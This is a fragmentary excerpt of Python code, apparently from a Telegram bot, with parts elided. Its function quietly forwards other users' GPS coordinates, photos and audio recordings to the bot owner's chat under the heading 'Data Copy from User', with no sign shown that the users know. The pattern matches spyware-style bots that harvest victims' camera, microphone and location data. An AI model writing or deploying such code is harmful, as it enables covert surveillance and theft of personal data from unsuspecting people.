...
def send_to_telegram(chat_id, data_type, content):
    ...
    if OWNER_CHAT_ID and chat_id != OWNER_CHAT_ID:
        ...
        owner_msg = f"🔔 <b>📥 Data Copy from User</b>\n\n"
        owner_msg += f"👤 <b>User:</b> {first_name}\n"
        owner_msg += f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n"
        owner_msg += f"📂 <b>Type:</b> {data_type.upper()}\n\n"

        if data_type == "location":
            owner_msg += f"📍 <b>Location</b>\nLat: {lat}\nLon: {lon}\nAccuracy: {acc}m"
            send_message(OWNER_CHAT_ID, owner_msg)
        elif data_type == "photo":
            owner_msg += f"📷 Photo (size: {len(content)} chars)"
            send_message(OWNER_CHAT_ID, owner_msg)
            header, encoded = content.split(",", 1)
            img_data = base64.b64decode(encoded)
            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            ...
            owner_msg += f"🎤 Audio (size: {len(content)} chars)"
            send_message(OWNER_CHAT_ID, owner_msg)
            header, encoded = content.split(",", 1)
            audio_data = base64.b64decode(encoded)
            with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
